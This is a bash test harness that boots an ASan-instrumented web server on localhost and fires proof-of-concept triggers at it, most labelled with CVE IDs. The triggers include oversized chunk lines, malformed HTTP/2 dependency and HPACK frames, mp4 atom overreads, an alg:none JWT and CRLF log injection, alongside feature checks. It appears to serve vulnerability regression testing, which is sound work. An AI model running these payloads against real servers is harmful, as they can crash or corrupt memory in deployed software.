#!/usr/bin/env bash
# live PoCs: run each trigger against the ASan-instrumented server.
# usage: live.sh [cve ...]
cd "$(dirname "$0")/../.."

BIN=./snx_asan
ERR=/tmp/snx_poc_err.log
UPLOG=/tmp/snx_upstream_req.bin
RESULTS=/tmp/snx_poc_results.txt
export ASAN_OPTIONS="detect_stack_use_after_return=1:allocator_may_return_null=1"
: > "$RESULTS"

boot() {
    pkill -x snx_asan 2>/dev/null
    sleep 0.3
    : > "$ERR"
    "$BIN" -g 2>"$ERR" &
    sleep 0.7
}

stop() {
    pkill -x snx_asan 2>/dev/null
}

req() {            # raw request on stdin
    python3 poc/http/req.py
}

pad() { python3 -c "import sys;sys.stdout.write(sys.argv[1]*int(sys.argv[2]))" "$1" "$2"; }

evidence() {       # $1=mode $2=arg
    case "$1" in
        asan)    grep -q 'AddressSanitizer' "$ERR" ;;
        dead)    ! pgrep -x snx_asan >/dev/null ;;
        alive)   pgrep -x snx_asan >/dev/null ;;
        hang)    [ ! -s /tmp/snx_resp ] && pgrep -x snx_asan >/dev/null ;;
        status)  head -1 /tmp/snx_resp | grep -q "$2" ;;
        out)     grep -aq "$2" /tmp/snx_resp ;;
        clog)    grep -q "$2" logs/error.log ;;
        elog)    grep -q "$2" "$ERR" ;;
        backend) grep -aq "$2" "$UPLOG" 2>/dev/null ;;
    esac
}

report() {         # $1=cve $2=PASS/FAIL $3=detail
    printf '%-18s %-4s %s\n' "$1" "$2" "$3" | tee -a "$RESULTS"
}

t() {              # $1=cve $2=evidence spec (mode:arg) $3=description
    local i
    boot
    eval "$TRIG" > /tmp/snx_resp 2>/dev/null
    for i in 1 2 3 4 5 6 7 8; do
        evidence "${2%%:*}" "${2#*:}" && break
        sleep 0.4
    done
    if evidence "${2%%:*}" "${2#*:}"; then
        report "$1" PASS "$3"
    else
        report "$1" FAIL "$3"
    fi
}

WANT=("$@")

want() { [ ${#WANT[@]} -eq 0 ] && return 0; local c; for c in "${WANT[@]}"; do [ "$c" = "$1" ] && return 0; done; return 1; }

# ---------- request-line tolerance ----------
if want CVE-2013-4547; then
TRIG='printf "GET /index.html sneaky-token HTTP/1.1\r\nHost: x\r\n\r\n" | req'
t CVE-2013-4547 'status:200' 'extra token in request line accepted (200 not 400)'
fi

# ---------- absolute URI without path -> NULL deref ----------
if want CVE-2009-3896; then
TRIG='printf "GET http://h HTTP/1.1\r\nHost: h\r\n\r\n" | req'
t CVE-2009-3896 'dead:x' 'absolute-form URI with empty path crashes worker'
fi

# ---------- unread body at keepalive -> NULL tf deref ----------
if want CVE-2016-4450; then
TRIG='printf "POST /index.html HTTP/1.1\r\nHost: x\r\nContent-Length: 8\r\n\r\nbodybody" | req'
t CVE-2016-4450 'dead:x' 'unread request body at keepalive -> NULL tf deref'
fi

# ---------- oversized chunk-size line -> stack overflow ----------
if want CVE-2013-2028; then
TRIG='{ printf "POST /index.html HTTP/1.1\r\nHost: x\r\nTransfer-Encoding: chunked\r\n\r\n"; pad A 200; printf "\r\n0\r\n\r\n"; } | req'
t CVE-2013-2028 'asan:x' 'oversized chunk-size line overflows szbuf[32]'
fi

# ---------- suffix range larger than file -> negative start ----------
if want CVE-2017-7529; then
TRIG='curl -s -D- --max-time 6 --max-time 4 -o /dev/null -H "Range: bytes=-999999" http://127.0.0.1:8080/index.html'
t CVE-2017-7529 'out:Content-Range: bytes -' 'suffix range beyond size -> negative Content-Range start + huge Content-Length'
fi

# ---------- alias sizing vs rewritten uri ----------
if want CVE-2026-15176; then
TRIG='printf "GET /r/x HTTP/1.1\r\nHost: x\r\n\r\n" | req'
t CVE-2026-15176 'asan:x' 'alias path sized on original uri, copied rewritten'
fi

# ---------- rewrite replacement expansion overflow ----------
if want CVE-2026-42945; then
TRIG='curl -s --max-time 6 "http://127.0.0.1:8080/e/$(pad A 64)"'
t CVE-2026-42945 'asan:x' 'rewrite replacement expansion overruns literal-sized buf'
fi

# ---------- set fixed 256B template buf ----------
if want CVE-2026-9256; then
TRIG='curl -s --max-time 6 "http://127.0.0.1:8080/setv/?x=$(pad A 400)"'
t CVE-2026-9256 'asan:x' 'set $v template expands past 256-byte buf'
fi

# ---------- uncapped complex eval (same primitive, script engine) ----------
if want CVE-2026-93479; then
TRIG='curl -s --max-time 6 "http://127.0.0.1:8080/setv/?x=$(pad B 300)"'
t CVE-2026-93479 'asan:x' 'complex-value eval writes without capacity bound'
fi

# ---------- map value expansion overflow ----------
if want CVE-2026-42533; then
TRIG='curl -s --max-time 6 "http://127.0.0.1:8080/index.html?x=$(pad M 64)"'
t CVE-2026-42533 'asan:x' 'map value expansion overruns literal-sized buf'
fi

# ---------- charset truncated multibyte seq ----------
if want CVE-2026-48142; then
TRIG='curl -s --max-time 6 "http://127.0.0.1:8080/charset/seq.html" -o /dev/null'
t CVE-2026-48142 'asan:x' '3-byte seq check reads p[2] past buffer end'
fi

if want CVE-2026-42934; then
TRIG='curl -s --max-time 6 "http://127.0.0.1:8080/charset/lead.html" -o /dev/null'
t CVE-2026-42934 'asan:x' '4-byte lead emits p[i] past buffer end'
fi

# ---------- ssi ctx freed while bufs reference it ----------
if want CVE-2026-56434; then
TRIG='curl -s --max-time 6 "http://127.0.0.1:8080/ssi/page.shtml" -o /dev/null'
t CVE-2026-56434 'asan:x' 'ssi filter frees ctx arena with live output bufs'
fi

# ---------- slice emits full slice beyond window ----------
if want CVE-2026-60005; then
TRIG='curl -s --max-time 6 "http://127.0.0.1:8080/slice/slice.shtml" -o /dev/null'
t CVE-2026-60005 'asan:x' 'slice keeps full slice_size on short crossing buf'
fi

# ---------- dav copy/move destination overflow ----------
if want CVE-2026-27654; then
TRIG='curl -s --max-time 6 -X COPY -H "Destination: /dav/DDDDD" "http://127.0.0.1:8080/dav/a.txt" -o /dev/null'
t CVE-2026-27654 'asan:x' 'dav destination buf sized without ext, copy includes it'
fi

# ---------- mp4 atoms ----------
if want CVE-2012-2089; then
TRIG='curl -s --max-time 6 "http://127.0.0.1:8080/mp4/stsz.mp4" -o /dev/null'
t CVE-2012-2089 'asan:x' 'stsz sample count trusted for alloc+fill'
fi
if want CVE-2022-41741; then
TRIG='curl -s --max-time 6 "http://127.0.0.1:8080/mp4/stss.mp4" -o /dev/null'
t CVE-2022-41741 'asan:x' 'stss table fill on trusted count'
fi
if want CVE-2022-41742; then
TRIG='curl -s --max-time 4 "http://127.0.0.1:8080/mp4/stts.mp4" -o /dev/null'
t CVE-2022-41742 'asan:x' 'stts unbounded entry count reads past atom window'
fi
if want CVE-2026-27784; then
TRIG='printf "GET /mp4/co64.mp4 HTTP/1.1\r\nHost: x\r\n\r\n" | req'
t CVE-2026-27784 'out:Content-Length: -' 'co64 offset accumulation -> negative Content-Length'
fi
if want CVE-2024-7347; then
TRIG='printf "GET /mp4/trak.mp4 HTTP/1.1\r\nHost: x\r\n\r\n" | req'
t CVE-2024-7347 'out:Content-Length: -' 'trak 16B read past atom -> tainted start'
fi
if want CVE-2018-16845; then
TRIG='curl -s --max-time 4 "http://127.0.0.1:8080/mp4/loop.mp4" -o /dev/null'
t CVE-2018-16845 'asan:x' 'atom size<8 -> misaligned re-parse -> runaway walk'
fi
if want CVE-2026-32647; then
TRIG='curl -s --max-time 6 "http://127.0.0.1:8080/mp4/over.mp4" -o /dev/null'
t CVE-2026-32647 'asan:x' 'parent-declared end beyond file -> ghost atom parsed'
fi

# ---------- scgi header-name overread ----------
if want CVE-2026-42946; then
TRIG='{ printf "GET /scgi/ HTTP/1.1\r\nHost: x\r\nX"; pad A 62; printf ": v\r\n\r\n"; } | req'
t CVE-2026-42946 'asan:x' 'long header name takes 64B copy from shorter storage'
fi

# ---------- grpc frame sizing ----------
if want CVE-2026-42055; then
TRIG='curl -s --max-time 6 -X POST -d "grpc-payload-body" "http://127.0.0.1:8080/grpc/" -o /dev/null'
t CVE-2026-42055 'asan:x' 'grpc frame buf sized blen, written blen+5'
fi

# ---------- proxy ----------
if want CVE-2026-42926 || want CVE-2013-2070 || want CVE-2012-1180; then
    python3 poc/http/backend.py &
    sleep 0.5
fi

if want CVE-2026-42926; then
TRIG='curl -s --max-time 6 -H "TE: trailers" -H "X-Smuggle: 1" "http://127.0.0.1:8080/proxy/" -o /dev/null'
t CVE-2026-42926 'backend:TE: trailers' 'hop-by-hop TE forwarded verbatim upstream'
fi

if want CVE-2013-2070; then
TRIG='curl -s --max-time 6 "http://127.0.0.1:8080/proxy/"'
t CVE-2013-2070 'out:B' 'backend response relayed via stack scratch (check body)'
fi

if want CVE-2012-1180; then
TRIG='curl -s --max-time 6 "http://127.0.0.1:8080/proxy/"'
t CVE-2012-1180 'out:B' 'backend drain loop relays stack-buffer chunks'
fi

# ---------- aio page freed while referenced ----------
if want CVE-2026-97205; then
TRIG='curl -s --max-time 6 "http://127.0.0.1:8080/aio/big.bin" -o /dev/null'
t CVE-2026-97205 'asan:x' 'aio page freed while output iobuf references it'
fi

# ---------- error log unsanitized ----------
if want CVE-2009-4487; then
TRIG='curl -s --max-time 6 "http://127.0.0.1:8080/%0d%0aINJECTED-LINE" -o /dev/null'
t CVE-2009-4487 'elog:INJECTED-LINE' 'decoded CRLF in uri breaks log lines'
fi

# ================= wire-listener / extra coverage =================

# ---------- h2c cleartext entry ----------
if want FEAT-H2C; then
TRIG='curl -s -o /dev/null -w "%{http_code}" --max-time 6 --http2-prior-knowledge http://127.0.0.1:8081/'
t FEAT-H2C 'out:200' 'h2c: preface+SETTINGS+HEADERS yields 200'
fi

# ---------- https + SNI vhost selection ----------
if want FEAT-TLS-SNI; then
TRIG='echo Q | openssl s_client -connect 127.0.0.1:8443 -servername two.example 2>/dev/null | openssl x509 -noout -subject 2>/dev/null'
t FEAT-TLS-SNI 'out:two.example' 'SNI two.example served CN=two.example cert'
fi

# ---------- EXTRA-TLS-SNI-OVERFLOW ----------
if want EXTRA-TLS-SNI-OVERFLOW; then
TRIG='LONG=$(python3 -c "print(\"a\"*200 + \".example\")"); echo Q | openssl s_client -connect 127.0.0.1:8443 -servername "$LONG" 2>/dev/null; sleep 0.5'
t EXTRA-TLS-SNI-OVERFLOW 'asan:x' '200B SNI overflows name[64] in sni callback'
fi

# ---------- smtp banner ----------
if want FEAT-SMTP; then
TRIG='nc -w 2 127.0.0.1 8025 </dev/null'
t FEAT-SMTP 'out:220' 'smtp listener greets with 220 banner'
fi

# ---------- imap greeting ----------
if want FEAT-IMAP; then
TRIG='nc -w 2 127.0.0.1 8143 </dev/null'
t FEAT-IMAP 'out:OK' 'imap listener sends tagged-capable greeting'
fi

# ---------- pop3 greeting ----------
if want FEAT-POP3; then
TRIG='nc -w 2 127.0.0.1 8110 </dev/null'
t FEAT-POP3 'out:+OK' 'pop3 listener greets +OK'
fi

# ---------- stream relay + proxy_protocol strip + preread ----------
if want FEAT-STREAM-PP || want EXTRA-PREREAD-PARTIAL || want FEAT-PREREAD; then
    python3 poc/http/backend.py &
    sleep 0.5
fi

if want FEAT-STREAM-PP; then
TRIG='rm -f "$UPLOG"; printf "PROXY TCP4 1.2.3.4 5.6.7.8 1234 80\r\nGET /x HTTP/1.0\r\n\r\n" | nc -w 3 127.0.0.1 9000 >/dev/null; sleep 0.4; grep -a GET "$UPLOG" 2>/dev/null | head -1'
t FEAT-STREAM-PP 'out:GET /x' 'stream: PROXY line consumed, GET relayed upstream'
fi

if want FEAT-PREREAD; then
TRIG='rm -f "$UPLOG"; printf "GET /x HTTP/1.0\r\n\r\n" | nc -w 3 127.0.0.1 9001 >/dev/null; sleep 0.4; head -c 20 "$UPLOG" 2>/dev/null'
t FEAT-PREREAD 'out:GET /x' 'preread: full prefix routes to 9100 upstream'
fi

# ---------- EXTRA-PREREAD-PARTIAL ----------
if want EXTRA-PREREAD-PARTIAL; then
TRIG='rm -f "$UPLOG"; { printf "G"; sleep 0.5; printf "ARBAGE\r\n\r\n"; } | nc -w 3 127.0.0.1 9001 >/dev/null; sleep 0.4; head -c 20 "$UPLOG" 2>/dev/null'
t EXTRA-PREREAD-PARTIAL 'out:GARBAGE' 'preread: 1-byte partial match locks route early'
fi

# ---------- auth_jwt ----------
if want FEAT-JWT; then
TRIG='H=$(echo -n "{\"alg\":\"none\"}" | base64 | tr "+/" "-_" | tr -d "="); P=$(echo -n "{\"exp\":4102444800}" | base64 | tr "+/" "-_" | tr -d "="); curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $H.$P.X" --max-time 6 http://127.0.0.1:8080/jwt/deep.txt'
t FEAT-JWT 'out:200' 'jwt: structurally-valid token admitted'
fi

if want FEAT-JWT-EXPIRED; then
TRIG='H=$(echo -n "{\"alg\":\"none\"}" | base64 | tr "+/" "-_" | tr -d "="); P=$(echo -n "{\"exp\":1}" | base64 | tr "+/" "-_" | tr -d "="); curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $H.$P.X" --max-time 6 http://127.0.0.1:8080/jwt/deep.txt'
t FEAT-JWT-EXPIRED 'out:401' 'jwt: expired token rejected 401'
fi

if want FEAT-JWT-MISSING; then
TRIG='curl -s -o /dev/null -w "%{http_code}" --max-time 6 http://127.0.0.1:8080/jwt/deep.txt'
t FEAT-JWT-MISSING 'out:401' 'jwt: missing token rejected 401'
fi

# ---------- quic udp listener survives datagrams ----------
if want FEAT-QUIC; then
TRIG='printf "\xc3\x00\x00\x00\x01\x08\x00\x00\x00\x00" | nc -u -w 1 127.0.0.1 8444 >/dev/null 2>&1; sleep 0.3; pgrep -x snx_asan >/dev/null && echo alive'
t FEAT-QUIC 'out:alive' 'quic: udp datagram dispatched, worker survives'
fi

# ---------- gunzip ----------
if want FEAT-GUNZIP; then
TRIG='curl -s --max-time 6 http://127.0.0.1:8080/gunz/t.txt'
t FEAT-GUNZIP 'out:gunzip decompress me ok' 'gunzip: plain client gets inflated body'
fi

if want FEAT-GUNZIP-AE; then
TRIG='curl -s --max-time 6 -H "Accept-Encoding: gzip" http://127.0.0.1:8080/gunz/t.txt -o /tmp/snx_gz.bin -w "%{http_code}"; head -c2 /tmp/snx_gz.bin | xxd -p | tr -d " \n"'
t FEAT-GUNZIP-AE 'out:2001f8b' 'gunzip: gzip client gets raw .gz bytes'
fi

if want EXTRA-GUNZIP-HDR; then
TRIG='curl -s --max-time 6 -o /dev/null http://127.0.0.1:8080/gunz/evil.txt; sleep 0.6; grep -c "snx_gz_hdr_skip" "$ERR" 2>/dev/null || echo 0'
t EXTRA-GUNZIP-HDR 'out:[1-9]' 'gunzip: FLG FNAME/FCOMMENT no-NUL overread (ASan)'
fi

# ---------- upstream keepalive stale fd ----------
if want EXTRA-UP-KEEPALIVE-STALE; then
TRIG='curl -s -o /dev/null -w "%{http_code}" --max-time 6 http://127.0.0.1:8080/up/; sleep 0.3; curl -s -o /dev/null -w "%{http_code}" --max-time 6 http://127.0.0.1:8080/up/'
t EXTRA-UP-KEEPALIVE-STALE 'out:200502' 'upstream keepalive: stale fd reused -> 502'
fi

# ---------- addition module + trailers ----------
if want FEAT-ADDITION; then
TRIG='curl -s --max-time 6 http://127.0.0.1:8080/add/main.txt | tr -d "\n"'
t FEAT-ADDITION 'out:BEFORE>MAIN<AFTER' 'addition: before+main+after body wrap'
fi

if want FEAT-ADD-TRAILER; then
TRIG='printf "GET /gunz/t.txt HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n" | nc -w 3 127.0.0.1 8080 | tail -c 30 | tr -d "\r\n"'
t FEAT-ADD-TRAILER 'out:X-Sum: ok' 'add_trailer: chunked trailer on the wire'
fi

if want EXTRA-ADDITION-LEN; then
TRIG='CL=$(curl -sI --max-time 6 http://127.0.0.1:8080/addbig/main.txt | awk "/[Cc]ontent-[Ll]ength/{print \$2}" | tr -d "\r"); GOT=$(curl -s --max-time 8 http://127.0.0.1:8080/addbig/main.txt | wc -c | tr -d " "); echo "cl=$CL got=$GOT"'
t EXTRA-ADDITION-LEN 'out:cl=100013 got=65549' 'addition: CL exceeds bytes sent (desync)'
fi

# ---------- h2 dep-cycle stack exhaustion ----------
if want EXTRA-H2-DEP-CYCLE; then
TRIG='python3 - <<PYEOF
import socket
s = socket.create_connection(("127.0.0.1", 8081), 5)
def frame(t, fl, sid, p):
    return len(p).to_bytes(3,"big") + bytes([t,fl]) + (sid&0x7fffffff).to_bytes(4,"big") + p
s.sendall(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n" + frame(4,0,0,b""))
s.sendall(frame(1, 0x5, 1, b"\x83\x84"))
s.sendall(frame(2, 0, 1, (1).to_bytes(4,"big") + b"\x01"))
s.sendall(frame(3, 0, 1, b"\x00\x00\x00\x00"))
PYEOF
sleep 0.6; grep -c "snx_h2_dep_reparent" "$ERR" 2>/dev/null || echo 0'
t EXTRA-H2-DEP-CYCLE 'out:[1-9]' 'h2: self-dep PRIORITY + RST -> stack overflow'
fi

# ---------- hpack huffman expansion overflow ----------
if want EXTRA-HPACK-HUFF-EXPAND; then
TRIG='python3 - <<PYEOF
import socket
def frame(t, fl, sid, p):
    return len(p).to_bytes(3,"big") + bytes([t,fl]) + (sid&0x7fffffff).to_bytes(4,"big") + p
bits = 0; n = 0
for _ in range(2500):
    bits = (bits << 5) | 0x0; n += 5
pad = (8 - n % 8) % 8
bits = (bits << pad) | ((1 << pad) - 1); n += pad
h = bits.to_bytes(n // 8, "big")
ln = len(h)
cont = bytearray(); r = ln - 127
while r >= 0x80:
    cont.append(0x80 | (r & 0x7f)); r >>= 7
cont.append(r)
blk = b"\x0f\x10\xff" + bytes(cont) + h
s = socket.create_connection(("127.0.0.1", 8081), 5)
s.sendall(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n" + frame(4,0,0,b"") + frame(1, 0x5, 1, blk))
PYEOF
sleep 0.6; grep -c "snx_huff_decode" "$ERR" 2>/dev/null || echo 0'
t EXTRA-HPACK-HUFF-EXPAND 'out:[1-9]' 'hpack: huffman expands past wire-len buf'
fi

# ---------- async upstream: split response headers ----------
if want FEAT-UP-SPLIT-HDRS; then
TRIG='python3 - <<PYEOF
import socket, threading, time, subprocess
def slow():
    s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("127.0.0.1", 9101)); s.listen(4)
    c, _ = s.accept()
    c.recv(4096)
    c.sendall(b"HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Leng")
    time.sleep(0.3)
    c.sendall(b"th: 8\r\nX-Split: yes\r\n\r\nSPLIT-OK")
    time.sleep(0.2); c.close()
threading.Thread(target=slow, daemon=True).start()
time.sleep(0.3)
r = subprocess.run(["curl","-s","--max-time","8","http://127.0.0.1:8080/split/"], capture_output=True, text=True)
print(r.stdout)
PYEOF'
t FEAT-UP-SPLIT-HDRS 'out:SPLIT-OK' 'upstream: headers split across packets reassembled'
fi

if want FEAT-WS-UPGRADE; then
TRIG='python3 - <<PYEOF
import socket, threading, time
def ws():
    s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
    s.bind(("127.0.0.1",9101)); s.listen(4); s.settimeout(15)
    c,_ = s.accept(); c.settimeout(6)
    c.recv(2048)
    c.sendall(b"HTTP/1.1 101 Switching Protocols\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n\r\n")
    while True:
        d = c.recv(1024)
        if not d: break
        c.sendall(b"WS-ECHO:"+d)
threading.Thread(target=ws, daemon=True).start(); time.sleep(0.5)
c = socket.create_connection(("127.0.0.1",8080), 5); c.settimeout(12)
c.sendall(b"GET /split/ HTTP/1.1\r\nHost: x\r\nUpgrade: websocket\r\n\r\n")
print(c.recv(2048)[:33].decode())
c.sendall(b"PING")
print(c.recv(256).decode())
PYEOF'
t FEAT-WS-UPGRADE 'out:WS-ECHO:PING' 'websocket: 101 + duplex frame relay'
fi

if want FEAT-STICKY; then
TRIG='curl -si --max-time 6 http://127.0.0.1:8080/st/ | grep -i set-cookie'
t FEAT-STICKY 'out:srv=[01]' 'sticky: Set-Cookie pins peer index'
fi

if want EXTRA-UP-STICKY-OOB; then
TRIG='curl -s -o /dev/null --max-time 6 -H "Cookie: srv=9" http://127.0.0.1:8080/st/; sleep 0.6; grep -c "snx_upstream_pick" "$ERR" 2>/dev/null || echo 0'
t EXTRA-UP-STICKY-OOB 'out:[1-9]' 'sticky: peers[idx] OOB read on bad cookie'
fi

stop
echo
echo "== summary =="
cat "$RESULTS"
